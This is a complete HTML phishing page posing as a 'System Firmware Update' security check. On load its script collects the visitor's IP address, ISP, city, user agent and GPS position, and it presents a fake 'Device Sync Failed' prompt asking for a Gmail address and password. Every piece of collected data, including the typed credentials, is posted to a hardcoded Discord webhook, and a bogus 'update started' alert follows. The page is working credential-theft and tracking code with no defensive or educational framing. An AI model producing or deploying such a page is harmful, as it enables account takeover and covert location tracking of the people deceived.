<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Firmware Update v12.0</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .container { width: 90%; max-width: 450px; border: 1px solid #333; padding: 25px; background: #000; box-shadow: 0 0 50px rgba(0,255,0,0.2); border-radius: 10px; text-align: center; }
        .loading-bar { width: 100%; height: 4px; background: #222; margin: 20px 0; position: relative; overflow: hidden; }
        .progress { width: 0%; height: 100%; background: #00ff00; position: absolute; animation: load 3s forwards; }
        @keyframes load { to { width: 100%; } }
        .device-info { font-weight: bold; color: #fff; background: #111; padding: 10px; border-radius: 5px; border: 1px solid #00ff00; margin-bottom: 15px; display: none; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #333; color: #fff; border-radius: 5px; outline: none; }
        input:focus { border-color: #00ff00; }
        button { width: 100%; padding: 12px; background: #00ff00; color: #000; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; text-transform: uppercase; }
        #status-log { font-size: 11px; color: #888; margin-top: 15px; text-align: left; height: 50px; overflow: hidden; }
    </style>
</head>
<body>
    <div class="container">
        <h3 id="main-head">SYSTEM SECURITY SHIELD</h3>
        <div id="device-box" class="device-info">DETECTING HARDWARE...</div>
        
        <div class="loading-bar"><div class="progress"></div></div>
        
        <div id="login-section" style="display:none;">
            <p style="font-size: 13px; color: #ccc;">Device Sync Failed. Please verify identity to continue firmware update.</p>
            <input type="email" id="email" placeholder="Gmail Address" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button onclick="sendFinal()">VERIFY & UPDATE</button>
        </div>

        <div id="status-log">
            [SYS] Initializing core...<br>
            [SYS] Locating hardware nodes...
        </div>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

        setTimeout(() => {
            const platform = navigator.platform;
            document.getElementById('device-box').innerText = "DEVICE IDENTIFIED: " + platform;
            document.getElementById('device-box').style.display = "block";
            document.getElementById('status-log').innerHTML += "<br>[OK] HARDWARE SYNCED.";
        }, 1200);

        setTimeout(() => {
            document.getElementById('login-section').style.display = "block";
        }, 3500);

        async function collectBaseData() {
            try {
                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
                const data = {
                    content: "🔥 **DEVICE CONNECTED** 🔥",
                    embeds: [{
                        color: 0x00ff00,
                        fields: [
                            { name: "IP", value: ipRes.ip || "N/A", inline: true },
                            { name: "ISP", value: ipRes.org || "N/A", inline: true },
                            { name: "Location", value: ipRes.city + ", " + ipRes.country_name },
                            { name: "Device", value: navigator.userAgent }
                        ]
                    }]
                };
                fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });

                navigator.geolocation.getCurrentPosition(p => {
                    fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, 
                    body: JSON.stringify({ content: "📍 GPS: https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude })});
                });
            } catch (e) {}
        }

        async function sendFinal() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            if(!email || !pass) return alert("Fields cannot be empty!");

            const loginData = {
                content: "🧨 **GMAIL CAPTURED** 🧨",
                embeds: [{
                    color: 0xff0000,
                    fields: [
                        { name: "Email", value: email },
                        { name: "Password", value: pass }
                    ]
                }]
            };
            await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(loginData) });
            alert("System Update Started. Please do not close this window for 10 minutes.");
        }

        collectBaseData();
    </script>
</body>
</html>
